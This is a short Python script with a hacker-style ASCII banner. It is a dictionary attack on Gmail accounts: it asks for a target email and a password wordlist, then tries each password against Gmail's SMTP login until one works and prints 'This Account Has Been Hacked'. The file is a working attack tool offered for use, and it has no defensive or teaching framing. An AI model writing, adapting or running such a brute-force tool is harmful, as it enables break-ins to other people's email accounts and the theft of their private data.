#!/usr/bin/python
'''create by Ha3MrX'''

import smtplib
from os import system

def main():
   print ('=================================================')
   print ('               create by Ha3MrX                  ')
   print ('=================================================')
   print ('               ++++++++++++++++++++              ')
   print ('\n                                               ')
   print ('  _,.                                            ')
   print ('                                                 ')
   print ('                                                 ')
   print ('           HA3MrX                                ')
   print ('       _,.                   ')
   print ('     ,` -.)                  ')
   print ('    ( _/-\\-._               ')
   print ('   /,|`--._,-^|            , ')
   print ('   \_| |`-._/||          , | ')
   print ('     |  `-, / |         /  / ')
   print ('     |     || |        /  /  ')
   print ('      `r-._||/   __   /  /   ')
   print ('  __,-<_     )`-/  `./  /    ')
   print ('  \   `---    \   / /  /     ')
   print ('     |           |./  /      ')
   print ('     /           //  /       ')
   print (' \_/  \         |/  /        ')
   print ('  |    |   _,^- /  /         ')
   print ('  |    , ``  (\/  /_         ')
   print ('   \,.->._    \X-=/^         ')
   print ('   (  /   `-._//^`           ')
   print ('    `Y-.____(__}             ')
   print ('     |     {__)              ') 
   print ('           ()   V.1.0        ')

main()
print ('[1] start the attack')
print ('[2] exit')
option = int(input('==>'))
if option == 1:
   file_path = input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = input('target email :')
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print (str(i) + '/' + str(len(pass_list)))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print ('\n')
         print ('[+] This Account Has Been Hacked Password :',  password + '     ^_^')
         break
      except:
         print ('[!] password not found => ' + password)
login()
